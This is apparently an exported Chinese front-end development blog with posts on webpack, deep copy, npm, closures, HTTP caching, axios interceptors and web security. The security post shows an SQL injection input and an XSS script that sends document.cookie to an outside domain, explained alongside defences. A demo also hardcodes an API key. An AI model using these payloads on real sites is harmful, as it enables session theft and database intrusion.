loader1cnpm install --save-dev file-loader在配置 webpack.config.js 匹配规则12345678910module: &#123; // 用来配置第三方loader模块的 rules: [ &#123; test: /\.(png|svg|jpg|gif)$/, use: [ 'file-loader' ] &#125; ]&#125;src 文件夹下images 文件下，添加一张图片，在 index.html 页面添加 div设置 id 为 img在 index.css 文件中设置背景图样式：如下123456#img&#123; background-image: url('../images/八神庵.png'); width: 200px; height: 200px; background-color: bisque;&#125;运行 npm run server 命令即可看下效果8.4: 加载 font 字体那么，像字体这样的其他资源如何处理呢？file-loader 和 url-loader 可以接收并加载任何文件，然后将其输出到构建目录。这就是说，我们可以将它们用于任何类型的文件，也包括字体。让我们更新 webpack.config.js 来处理字体文件：webpack.config.js12345678910module: &#123; rules: [ &#123; test: /\.(woff|woff2|eot|ttf|otf)$/, use: [ 'file-loader' ] &#125; ]&#125;在项目中添加一些字体文件：main.js 导入 font.css 文件1import './css/font.css';配置好 loader 并将字体文件放在合适的位置后，你可以通过一个 @font-face 声明将其混合。本地的 url(...) 指令会被 webpack 获取处理，就像它处理图片一样：在 index.css 文件中123456789101112@font-face &#123; font-family: 'MyFont'; src: url('../fonts/MiFie-Web-Font.woff') format('woff'), url('../fonts/MiFie-Web-Font.svg') format('svg'); font-weight: 600; font-style: normal;&#125;/* 设置使用字体为 MyFont */html body &#123; font-size: 50px; font-family: 'MyFont';&#125;在页面添加一个标签，类名为字体图标类名，如下1&lt;span class="icon-meiyuan"&gt;&lt;/span&gt;运行 npm run server 命令即可看下效果9: bable 的使用Babel其实是一个编译JavaScript的平台，它可以编译代码帮你达到以下目的：webpack默认只能处理部分ES6语法，一些更高级的ES6或ES7语法，需要借助第三方的loader处理，转为低级的语法后，而不用管新标准是否被当前使用的浏览器完全支持；，把结果交给webpack打包到bundle.js中。让你能使用基于JavaScript进行了拓展的语言，比如React的JSX；9.1: Babel的安装与配置Babel其实是几个模块化的包，其核心功能位于称为babel-core的npm包中，webpack可以把其不同的包整合在一起使用，对于每一个你需要的功能或拓展，你都需要安装单独的包（用得最多的是解析Es6的babel-env-preset包和解析JSX的babel-preset-react包）。我们先来一次性安装这些依赖包1npm install --save-dev "babel-loader@^8.0.0-beta" @babel/core @babel/preset-env在 webpack.config.js 配置对象中，需要添加 babel-loader 到 module 的 loaders 列表中，像下面这样：1234567891011121314module: &#123; rules: [ &#123; test: /\.js$/, exclude: /(node_modules|bower_components)/, use: &#123; loader: 'babel-loader', options: &#123; presets: ['@babel/preset-env'] &#125; &#125; &#125; ]&#125;在项目根目录中添加.babelrc文件，并修改这个配置文件如下]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一篇搞懂深浅拷贝与实现方法]]></title>
    <url>%2F2019%2F03%2F04%2F%E4%B8%80%E7%AF%87%E6%90%9E%E6%87%82%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1. 前言此篇文章中也会简单阐述到栈堆，基本数据类型与引用数据类型，因为这些概念能更好的让你理解深拷贝与浅拷贝。更多参考 ：js面试题：实现对象深度克隆（deepClone）的三种方案2. 什么是浅拷贝与深拷贝？如何区分深拷贝与浅拷贝，简单点来说，就是假设B复制了A，当修改A时，看B是否会发生变化，如果B也跟着变了，说明这是浅拷贝，拿人手短，如果B没变，那就是深拷贝，自食其力。举个板栗：12345let a=[0,1,2,3,4], b=a;console.log(a===b);a[0]=1;console.log(a,b);嗯？明明b复制了a，为啥修改数组a，数组b也跟着变了 ? 继续看下面！那么这里，就得引入 基本数据类型 与 引用数据类型 的概念了。3. 基本数据类型和引用数据类型面试也会经常问：基本数据类型有哪些？ number,string,boolean,null,undefined五类。引用数据类型(Object类)有常规名值对的无序 对象 {a:1}，数组[1,2,3]，以及函数等。而这两类数据存储分别是这样的：a.基本类型–键值存储在栈内存中当你b=a复制时，栈内存会新开辟一个内存，例如这样：所以当你此时修改a=2，对b并不会造成影响，因为此时的b已自食其力，翅膀硬了，不受a的影响了。当然，let a=1,b=a;虽然b不受a影响，但这也算不上深拷贝，因为深拷贝本身只针对较为复杂的object类型数据。b.引用数据类型–键存在栈内存中，值存在于堆内存中，但是栈内存会提供一个引用的地址指向堆内存中的值，我们以上面浅拷贝的例子画个图：当b=a进行拷贝时，其实复制的是a的引用地址，而并非堆里面的值。当我们 a[0]=1 时进行数组修改时，由于a与b指向的是同一个地址，所以自然b也受了影响，这就是所谓的浅拷贝了。那，要是在堆内存中也开辟一个新的内存专门为b存放值，就像基本类型那样，岂不就达到深拷贝的效果了这里就抛出本篇文章的核心问题：如何实现对引用数据类型进行拷贝时希望它开辟新的堆空间，而非引用原地址的堆空间。及所谓的深拷贝。5. 深拷贝，是拷贝对象各个层级的属性（占坑）举个板栗说明下：1234let a=[1,2,3,4];let b=a.slice();a[0]=2;console.log(a,b);那是不是说 slice 方法也是深拷贝了，毕竟b也没受a的影响，上面说了，深拷贝是会拷贝所有层级的属性，还是这个例子，我们把a 再改改（添加了一个双层数组）12345let a=[0,1,[2,3],4];let b=a.slice();a[0]=1;a[2][0]=1;console.log(a,b);拷贝的不彻底啊，b对象的一级属性确实不受影响了，但是二级属性还是没能拷贝成功，仍然脱离不了a的控制，说明slice根本不是真正的深拷贝。这里引用知乎问答里面的一张图第一层的属性确实深拷贝，拥有了独立的内存，但更深的属性却仍然公用了地址，所以才会造成上面的问题。同理，concat 方法与 slice 也存在这样的情况，他们都不是真正的深拷贝，而是属于浅拷贝，他们其实是披着羊（qian）皮（kao）的（bei）狼。这里需要注意。那如何实现真正的深拷贝？继续看下面！5. 实现深拷贝的几种常见方法5.1 使用递归去复制所有层级属性。这么我们封装一个深拷贝的函数1234567891011121314151617181920212223function deepClone(obj) &#123; let objClone = Array.isArray(obj) ? [] : &#123;&#125;; if (obj &amp;&amp; typeof obj === "object") &#123; for (key in obj) &#123; if (obj.hasOwnProperty(key)) &#123; //判断ojb子元素是否为对象，如果是，递归复制 if (obj[key] &amp;&amp; typeof obj[key] === "object") &#123; objClone[key] = deepClone(obj[key]); &#125; else &#123; //如果不是，简单复制 objClone[key] = obj[key]; &#125; &#125; &#125; &#125; return objClone;&#125;// 测试代码let a = [1, 2, [1,5], 4], b = deepClone(a);a[0] = 2;a[2][0] = 5;console.log(a, b);经测试，确实实现了深浅拷。5.2 借用JSON对象的 parse和stringify123456var a = [1, 2, [1,5], 4];var b = JSON.stringify(a);b = JSON.parse(b);a[0] = 2;a[2][0] = 5;console.log(a, b);可以看到，这下b是完全不受a的影响了。这里方法属于投机取巧，但是也确实可以实现深拷贝附带说下，JSON.stringify与JSON.parse除了实现深拷贝，还能结合localStorage实现对象数组存储。注意：此方法对象中含有函数方法的时候不行，undefined，function，symbol在转换中会丢失5.3 借用jQuery的extend方法。jQuery.extend() 函数用于将一个或多个对象的内容合并到目标对象。语法：$.extend( [deep ], target, object1 [, objectN ] )​ deep 表示是否深拷贝，为true为深拷贝，为false，则为浅拷贝​ target Object 类型 目标对象，其他对象的成员属性将被附加到该对象上。​ object1 ObjectN 可选。 Object类型 第一个以及第N个被合并的对象。12345let a = [1, 2, [1, 5], 4];let b = $.extend(true, [], a);a[0] = 2;a[2][0] = 5;console.log(a, b);可以看到，效果与上面方法一样，只是需要依赖JQ库。######5.4 借用 ES6 展开运算符实现123456789var obj = &#123; name: 'FungLeo', sex: 'man', old: '18'&#125;var &#123; ...obj2 &#125; = objobj.old = '22'console.log(obj)console.log(obj2)]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>深拷贝与浅拷贝</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的接口API]]></title>
    <url>%2F2019%2F03%2F04%2F%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%A5%E5%8F%A3API%2F</url>
    <content type="text"><![CDATA[1: 网易云接口文档 API1https://binaryify.github.io/NeteaseCloudMusicApi/#/]]></content>
      <categories>
        <category>第三方接口</category>
      </categories>
      <tags>
        <tag>API接口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的WEB安全问题及解决方案]]></title>
    <url>%2F2019%2F03%2F04%2F%E5%B8%B8%E8%A7%81%E7%9A%84WEB%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[互联网项目中安全问题日益得到重视，前期出现某公司泄露用户信息，记者又有网站被黑，甚至有窃取网银事件发生。在常见的web系统中，最常见的几种安全问题有：SQL注入，XSS漏洞，CSRF攻击（跨站点请求伪造）。1. SQL注入SQL注入之所以存在，主要是因为工程师将外部的输入直接嵌入到将要执行的SQL语句中了。黑客可以利用这一点执行SQL指令来达到自己目的。例如： $sql = ‘select * from user where id =’.$id;这里用用户输入的变量$id来拼接SQL语句，存在安全隐患。如果$i = ‘2 or 1=1’，这里就能轻松的获取到user表的仍意信息。利用SQL注入漏洞，我们能够获取想要的信息，同时可以通过猜测和报错获取到数据库其它表的结构和信息，如果数据库、服务器权限设置不当，甚至有可能能获取到整个服务器的控制权限。解决方案：1.写一个ORM(Object Relational Mapping,实现面向对象编程语言里不同类型系统的数据之间的转换),这样可以避免直接拼接SQL 语句，少了不少麻烦而且能大大提高开发效率。2.如果非得写一些原生的SQL拼接语句，则我们必须对输入的那些变量进行优化过滤.​ a.如果查询的字段类型是数字等类型，在拼接SQL前先判断输入是不是一个合法的数字，不合法则终止程序即可。$id=intval($_GET[‘id’]);​ b.如果字段类型是字符串，则记得将输入里的的单引号进行转义。​ ps:关于php防止SQL注入对输入的特殊符号进行转义的相关知识：​ 当php.ini里的 magic_quotes_gpc 为On 时。提交的变量中所有的 ‘ (单引号), “ (双引号), \ (反斜线) and 空字符会自动转为含有反斜线的转义字符，给SQL注入带来 不少的麻烦。但是利用改变注入语句的编码来绕过转义的方法，比如将SQL语句转成 ASCII编码（类似：char(100,58,92,108,111,99,97,108,104,111,115,116…) 这样的格式），或者转成 16进制编码，甚至还有其他形式的编码，这样以来，转义过滤便被绕过去了，这时候我们可以这样对经过转移的数据这样处理：123456789101112//去除转义字符function stripslashes_array($array)&#123; if (is_array($array)) &#123; foreach ($array as $k =&gt; $v) &#123; $array[$k] = stripslashes_array($v); &#125; &#125; else if (is_string($array)) &#123; $array = stripslashes($array); &#125; return $array; &#125;$_POST = array_map('stripslashes_deep', $_POST);​ 或者在未开启magic_quotes_gpc 时：12345$keywords = addslashes($keywords); $keywords = str_replace("_","\_",$keywords);//转义掉”_” $keywords = str_replace("%","\%",$keywords);//转义掉”%”// 后两个str_replace替换转义目的是防止黑客转换SQL编码进行攻击。2. XSS攻击如果说SQL注入是直接在SQL里执行了用户输入，那XSS攻击是在HTML里代码执行了用户输入。相对SQL注入，XSS似乎更能引起人关注。几年前新浪微博被人利用XSS获取大量粉丝；3DM也曾经被植入script代码对另一个游戏网站进行了惨无人道的DDOS攻击。例子：一个文本框 &lt;input type=&quot;text&quot; name=&#39;keyname&#39; value=&quot;&quot;&gt;在页面上我输入了这样的代码：&lt;script&gt;window.location.href=&#39;MyDomain.com?cookie=&#39; + document.cookie&lt;/script&gt;;这段代码获取到当前页面的cookie值，并将cookie值传递到另一个名为MyDomain.com的网站。利用这种模式，黑客可以获取到用户的登录信息或者将用户跳转到钓鱼网站来达成自己的目的。SS攻击也可以简单分为两种，一种是上述例子中利用url引诱客户点击来实现；另一种是通过存储到数据库，在其它用户获取相关信息时来执行脚本。解决方案：将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了.只允许用户输入我们期望的数据。 例如： 年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。对数据进行Html Encode 处理过滤或移除特殊的Html标签， 例如: &lt;script&gt;, &lt;iframe&gt; , &amp;lt; for &lt;, &amp;gt; for &gt;, &amp;quot for过滤JavaScript 事件的标签。例如 &quot;onclick=&quot;, &quot;onfocus&quot;等等。3. CSRF攻击（跨站点请求伪造）顾名思义，是伪造请求，冒充用户在站内的正常操作。例子：一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：http://example.com/bbs/create_post.php?title=标题&amp;content=内容那么，我只需要在论坛中发一帖，包含一链接：http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。解决方案：​ 对这种问题我们一般的解决方法是：通过session token来实现保护。当客户端请求页面时，服务器会生成一个随机数Token，并且将Token放置到session当中，然后将Token发给客户端（一般通过构造hidden表单）。下次客户端提交请求时，Token会随着表单一起提交到服务器端。接收到请求后，服务器端会对Token值进行验证，判断是否和session中的Token值相等，若相等，则可以证明请求有效，不是伪造的。ps:题外话，这里的session token机制也可用于注册或者cms文章添加等功能上，可以用来防止用户”重复提交”，相比于上面的CSRF方案是这样的：服务器端第一次验证相同过后，会将涩session中的Token值更新下，若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数防抖与节流]]></title>
    <url>%2F2019%2F03%2F04%2F%E5%87%BD%E6%95%B0%E9%98%B2%E6%8A%96%E4%B8%8E%E8%8A%82%E6%B5%81%2F</url>
    <content type="text"><![CDATA[1: 参考https://www.cnblogs.com/chenqf/p/7986725.html]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>防抖与节流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm 介绍及常用命令]]></title>
    <url>%2F2019%2F03%2F04%2Fnpm%20%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[npm 是开发者查找包（package）、设置参数以及管理 npm 使用体验的主要途径，只要电脑安装了 node 就 安装了 npm 包管理工具1: npm 官网地址1https://www.npmjs.com/2: npm常用命令123456789npm install --global npm // 自己升级自己npm init // 项目初始化npm init -y // 可以直接跳过向导，快速生成npm install // 一次性把dependencies选项中的依赖项全部安装npm install 包名 //下载包名npm install --save 包名 //下载并保存依赖项，（package.json文件中的dependenice选项）npm uninstall 包名 //只删除，如果有依赖选会依然保存npm uninstall --save 包名 //删除的同时会把依赖的信息也去除npm help //查看使用帮助3: 安装慢或者被墙问题解决办法npm存储包文件的服务器在国外，有时候会被墙，速度很慢，所以我们需要解决这个问题http://npm.taobao.org/：淘宝的开发团队吧npm在国内做了一个备份，每10分钟会被备份一次所以我们安装淘宝的cnpm1npm install --global npm接下来你安装包的时候把之前的npm替换成cnpm既可：举列如下12345//这个是走国外的服务器，速度比较慢npm install jquery//使用cnpm 就是走淘宝服务器，速度比较快。cnpm install jquery如果不想安装cnpm又想使用淘宝的服务器来下载：123npm config set registry=https://registry.npm.taobao.org//查看npm配置文件npm config list]]></content>
      <categories>
        <category>node.js</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快递单号接口API]]></title>
    <url>%2F2019%2F03%2F04%2F%E5%BF%AB%E9%80%92%E5%8D%95%E5%8F%B7%E6%8E%A5%E5%8F%A3API%2F</url>
    <content type="text"><![CDATA[1: 应用场景：物流信息查询2: 本接口采用的是聚合数据接口1https://www.juhe.cn/docs/api/id/433: 注册账号申请快递单号接口：获取申请的key4: 接口参数查看（主要是这三个需要传到服务端）5: Demo 代码12345678910111213141516171819&lt;!-- Jquery保证在1.12及以上 --&gt;&lt;script src="./jquery-1.12.4.js"&gt;&lt;/script&gt;&lt;script&gt; var $key = "870967b6f718e99ceda764f1829c1763"; //申请的商户ID var $kdNumber = "3383748328872"; //快递单号 var $com = "sto"; //快递物流公司简称 如：STO申通 SF顺风等 $.get(&#123; url:'http://v.juhe.cn/exp/index', data:&#123; key : $key, com : $com, no : $kdNumber &#125;, dataType:"jsonp", success:function(data)&#123; console.log(data); &#125; &#125;);&lt;/script&gt;使用JQuery的Ajax访问（经测试直接访问获取不到数据，因为服务端没有主动设置开放CROS资源共享）浏览器会默认同源策略，所以访问失败。需要设 dataType = “jsonp” 跨域访问。返回成果的物流信息6: 查看聚合数据支持的哪些快递公司的查询1https://www.juhe.cn/box/index/id/43]]></content>
      <categories>
        <category>第三方接口</category>
      </categories>
      <tags>
        <tag>API接口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS 闭包的深入理解]]></title>
    <url>%2F2019%2F03%2F02%2F%E9%97%AD%E5%8C%85%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[1: JS中什么是闭包 ？就是函数 （闭包是一个可以获取其他函数内部变量的函数）2: 闭包作用延长生命周期在函数外部要想访问或者修改数据,只能通过函数的内部的方法设置安全措施,校验之内的操作,可以保证系统的安全性和稳定性3: 闭包语法函数内部声明一个闭包函数在闭包函数中返回想要访问的局部变量返回闭包函数4: 闭包本质：函数内部与函数外部连接起来的一座桥梁5: 闭包的原理上级作用域无法访问下级的作用域6: 闭包要解决的问题闭包内的数据不允许外界访问要解决的问题就是间接的访问该数据7: 闭包的实际应用场景12345678910111213141516171819202122/*闭包实际开发应用场景 -----沙箱模式 ： 一种独立的内存空间，通常是匿名函数自调用 a.提供不同的作用域---避免全局变量污染 b.模块化开发----不同的功能对应不同的作用域 */(function ( w ) &#123; var p = &#123; name:'张三', sayHi:function ( ) &#123; console.log ( "今天学到好多东西" ); &#125; &#125;; var num = 10; //沙箱模式中所有的变量都是局部的，如何可以在外部全局变量中访问？ //将需要暴露外部的api作为window的属性 /*这里为什么不直接使用window而使用形参来接收呢？ 1.沙箱内部不能直接访问外部变量，会破坏封装性 2.以后的开发中为了减少js文件的大小，会使用专业的压缩工具来压缩,为了避免压缩工具压缩代码导致错误， 通常不直接使用window */ w.p = p;&#125;)(window);console.log ( p );//window.person8: 简单的闭包实例获取或者修改数据获取多个数据和修改多个数据9: 闭包经典面试题9.1: 求 this 的指向1234567891011121314// 返回: Window Name，调用person.getName() 返回值是一个匿名函数，此时在全局作用域中调用匿名函数，此时this指向windowvar name = 'Window Name';var person = &#123; name:'Object Name', getName:function ( ) &#123; return function ( ) &#123; return this.name; &#125; &#125;&#125;;// var fn = person.getName();// fn();console.log ( person.getName () () );//Window Name12345678910111213// 调用person.getName(),在getName方法中this指向person。此时用一个句变量that存储this（person），返回一个匿名函数，函数中that指向personvar name = 'Window Name';var person = &#123; name:'Object Name', getName:function ( ) &#123; var that = this; return function ( ) &#123; return that.name; &#125; &#125;&#125;;console.log ( person.getName () () );//Object Name9.2: 使用闭包来计算数组递归:(高性能)12345678910111213function feiBo() &#123; var arr = [1,1,0]; function closoure(n) &#123; for (var i = 2; i &lt; n; i++) &#123; arr[2] = arr[0] + arr[1]; arr[0] = arr[1]; arr[1] = arr[2]; &#125; return arr[2]; &#125; return closoure;&#125;console.log(feiBo()(10));]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[点透问题及解决方案]]></title>
    <url>%2F2019%2F02%2F14%2F%E7%82%B9%E9%80%8F%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[1. 点透场景层A 覆盖在层B上面，常见的有对话框等，层A用 touchstart 或者tap(zepto)事件点击进行隐藏或者移开，由于click晚于touchstart，超过300ms，当层A隐藏后，click到的是下面的层B，此时层B的click事件会触发，或者其上的a链接会跳转，input，select会吊起键盘。2. zepto的tap事件原理zepto的 tap 事件是通过 touchstart , touchend (android 4.0.x不支持touchend，通过touchmove 设置定时器触发touched)模拟出来的，事件是绑定在document上，大体思路是在touchstart的时候向对象附加点击的x,y；（其中还包含很多细节，比如设置最后点击时间，设置长按定时器等);touchmove的过程动态的计算手势在view上的偏移点，最后touchend 根据偏移点确定是否是点击，如果是点击动态的构建一个event然后根据设置的状态获取是单机、双击。非zepto的tap事件未必会出现点透问题。3. 点透解决方案来得很直接github上有个fastclick可以完美解决https://github.com/ftlabs/fastclick引入fastclick.js，因为fastclick源码不依赖其他库所以你可以在原生的js前直接加上123window.addEventListener( "load", function() &#123; FastClick.attach( document.body );&#125;, false );用touchend代替tap事件并阻止掉touchend的默认行为preventDefault(),因为触发touchend需要200ms所以可以把触发时间这个原理问题解决掉1234$("#cbFinish").on("touchend", function (event) &#123; //很多处理比如隐藏什么的 event.preventDefault();&#125;);利用touch事件模拟click，延迟一定的时间(300ms+)来处理事件12345$("#cbFinish").on("tap", function (event) &#123; setTimeout(function()&#123; //很多处理比如隐藏什么的 &#125;,320);&#125;);这种方法其实很好，可以和fadeInIn/fadeOut等动画结合使用，可以做出过度效果直接用click，不考虑延迟，下层避开click事件，如a链接改为span等标签，使用js跳转页面]]></content>
      <categories>
        <category>移动web</category>
      </categories>
      <tags>
        <tag>点透问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[彻底弄懂HTTP缓存机制及原理]]></title>
    <url>%2F2018%2F09%2F04%2F%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82HTTP%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[1. 前言转载自 博客园（木上有水），终于找到了一篇就能搞懂http缓存机制的文章，非常详细，转载收藏下。Http 缓存机制作为 web 性能优化的重要手段，对于从事 Web 开发的同学们来说，应该是知识体系库中的一个基础环节，同时对于有志成为前端架构师的同学来说是必备的知识技能。但是对于很多前端同学来说，仅仅只是知道浏览器会对请求的静态文件进行缓存，但是为什么被缓存，缓存是怎样生效的，却并不是很清楚。在此，我会尝试用简单明了的文字，像大家系统的介绍HTTP缓存机制，期望对各位正确的理解前端缓存有所帮助。在介绍HTTP缓存之前，作为知识铺垫，先简单介绍一下HTTP报文2. HTTP 报文HTTP报文就是浏览器和服务器间通信时发送及响应的数据块。浏览器向服务器请求数据，发送 请求(request)报文 ；服务器向浏览器返回数据，返回 响应(response)报文。报文信息主要分为两部分包含属性的首部(header)——–附加信息（cookie，缓存信息等）与缓存相关的规则信息，均包含在header中包含数据的主体部分(body)——HTTP请求真正想要传输的部分3. 缓存规则解析为方便大家理解，我们认为浏览器存在一个缓存数据库,用于存储缓存信息。在客户端第一次请求数据时，此时缓存数据库中没有对应的缓存数据，需要请求服务器，服务器返回后，将数据存储至缓存数据库中。HTTP缓存有多种规则，根据是否需要重新向服务器发起请求来分类，我将其分为两大类 强制缓存 对比缓存在详细介绍这两种规则之前，先通过时序图的方式，让大家对这两种规则有个简单了解。3.1 强制缓存规则已存在缓存数据时，仅基于强制缓存，请求数据的流程如下：已存在缓存数据时，仅基于对比缓存，请求数据的流程如下对缓存机制不太了解的同学可能会问，基于对比缓存的流程下，不管是否使用缓存，都需要向服务器发送请求，那么还用缓存干什么？这个问题，我们暂且放下，后文在详细介绍每种缓存规则的时候，会带给大家答案。我们可以看到两类缓存规则的不同，强制缓存如果生效，不需要再和服务器发生交互，而对比缓存不管是否生效，都需要与服务端发生交互。两类缓存规则可以同时存在，强制缓存优先级高于对比缓存，也就是说，当执行强制缓存的规则时，如果缓存生效，直接使用缓存，不再执行对比缓存规则。4. 强制缓存从上文我们得知，强制缓存，在缓存数据未失效的情况下，可以直接使用缓存数据，那么浏览器是如何判断缓存数据是否失效呢？我们知道，在没有缓存数据的时候，浏览器向服务器请求数据时，服务器会将数据和缓存规则一并返回，缓存规则信息包含在响应header中。对于强制缓存来说，响应header中会有两个字段来标明失效规则（Expires/Cache-Control）使用chrome的开发者工具，可以很明显的看到对于强制缓存生效时，网络请求的情况4.1 ExpiresExpires的值为服务端返回的到期时间，即下一次请求时，请求时间小于服务端返回的到期时间，直接使用缓存数据。不过Expires 是HTTP 1.0的东西，现在默认浏览器均默认使用HTTP 1.1，所以它的作用基本忽略。另一个问题是，到期时间是由服务端生成的，但是客户端时间可能跟服务端时间有误差，这就会导致缓存命中的误差。所以HTTP 1.1 的版本，使用Cache-Control替代。4.2 Cache-ControlCache-Control 是最重要的规则。常见的取值有private、public、no-cache、max-age，no-store，默认为private。private: 客户端可以缓存public: 客户端和代理服务器都可缓存（前端的同学，可以认为public和private是一样的）max-age=xxx: 缓存的内容将在 xxx 秒后失效no-cache: 需要使用对比缓存来验证缓存数据（后面介绍）no-store: 所有内容都不会缓存，强制缓存，对比缓存都不会触发（对于前端开发来说，缓存越多越好，so…基本上和它说886）举个板栗图中Cache-Control仅指定了max-age，所以默认为private，缓存时间为31536000秒（365天）也就是说，在365天内再次请求这条数据，都会直接获取缓存数据库中的数据，直接使用。5. 对比缓存对比缓存，顾名思义，需要进行比较判断是否可以使用缓存。浏览器第一次请求数据时，服务器会将缓存标识与数据一起返回给客户端，客户端将二者备份至缓存数据库中。再次请求数据时，客户端将备份的缓存标识发送给服务器，服务器根据缓存标识进行判断，判断成功后，返回304状态码，通知客户端比较成功，可以使用缓存数据。第一次访问：再次访问：通过两图的对比，我们可以很清楚的发现，在对比缓存生效时，状态码为304，并且报文大小和请求时间大大减少。原因是，服务端在进行标识比较后，只返回header部分，通过状态码通知客户端使用缓存，不再需要将报文主体部分返回给客户端。对于对比缓存来说，缓存标识的传递是我们着重需要理解的，它在请求header和响应header间进行传递，一共分为两种标识传递，接下来，我们分开介绍。6. Last-Modified / If-Modified-Since6.1 Last-Modified：服务器在响应请求时，告诉浏览器资源的最后修改时间。6.2 If-Modified-Since再次请求服务器时，通过此字段通知服务器上次请求时，服务器返回的资源最后修改时间。服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若资源的最后修改时间大于If-Modified-Since，说明资源又被改动过，则响应整片资源内容，返回状态码200；若资源的最后修改时间小于或等于If-Modified-Since，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache。7. Etag / If-None-Match（优先级高于Last-Modified / If-Modified-Since）7.1 Etag：服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。7.2 If-None-Match：再次请求服务器时，通过此字段通知服务器客户段缓存数据的唯一标识。服务器收到请求后发现有头If-None-Match 则与被请求资源的唯一标识进行比对，不同，说明资源又被改动过，则响应整片资源内容，返回状态码200；相同，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache。8. 总结对于强制缓存，服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不在时间内，执行比较缓存策略。对于比较缓存，将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存。浏览器第一次请求：浏览器再次请求时：]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP缓存机制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的业务逻辑处理]]></title>
    <url>%2F2018%2F09%2F04%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[1: 登录的业务逻辑随便找一个空白页面撸上两个input的框，一个是登录账号，一个是登录密码，再放置一个登录按钮。我们将登录按钮上绑上click事件，点击登录之后向服务端提交账号和密码进行验证。登录成功重定向到首页，登录失败提示错误。登录成功后将token存储在cookie中登录成功后，服务端返回一个token（该token是一个唯一的标示身份的key）,之后我们将token存储在本地cookie中，这样下次页面打开或者刷新页面的时候就能记住用户的登录状态，不用再去登录页面重新登录了。PS：登录安全性：用户登录密码采用MD5+盐（不可逆）加密处理公司后端所以的token有效期都是Session，就是当浏览器关闭就丢失了，重新打开浏览器都需要重新登录验证。后端也会每周固定一个时间定点刷新token，让后台用户全部重新登录一次，确保后台用户不会因为电脑遗失获取其他原因导致随意使用账户问题。#####2: 权限的业务逻辑3: axios拦截器axios 拦截器是非常强大的功能，同时分为 请求拦截器 和 响应拦截器 ，公司服务端对每一个请求都会验证权限操作。如（未登录不能访问我的订单页面），首先通过 request拦截器 在请求头塞入一个 token，好让后端进行权限验证，同时创建一个 respone拦截器 当服务端返回特殊状态码，我们可以统一做处理，如没有权限或者token失效等操作。1234567891011121314// 设置拦截器 (回调函数)axios.interceptors.request.use( function(config) &#123; // 除了登录 都设置token if (config.url.indexOf('/login') == -1) &#123; // 不是登录接口 config.headers.Authorization = window.sessionStorage.getItem('token') &#125; return config &#125;, function(error) &#123; return Promise.reject(error) &#125;)12345678910// 设置拦截器 响应拦截器axios.interceptors.response.use( function(response) &#123; Vue.prototype.$message(response.data.meta.msg) return response; &#125;, function(error) &#123; return Promise.reject(error) &#125;)4: 购物车简单说一下这个功能模块的需求：勾选全选反选，所有的商品全部选中。在取消全选的时候所有的商品取消选择；点击单个商品的加号和减号的时候数量增加和减少，商品总数和商品总价格实时计算；点击单个商品上的删除按钮将商品从购物车删除，商品总数和商品总价格实时计算；底部实现选中状态的产品金额累计和及商品总数；通过商品详情页加入到购物车：点击我的购物车12345678910111213141516171819202122async created() &#123; let ids = '' // 仓库中的数据 for (const key in this.$store.state.goodsData) &#123; ids += key ids += ',' &#125; // 去掉, 结果如： 1,2,3,4 （后端需要的是商品ID，用逗号连接） ids = ids.slice(0, -1) // 数据获取 let res = await this.$http.get(`site/comment/getshopcargoods/$&#123;ids&#125;`) // 动态增加 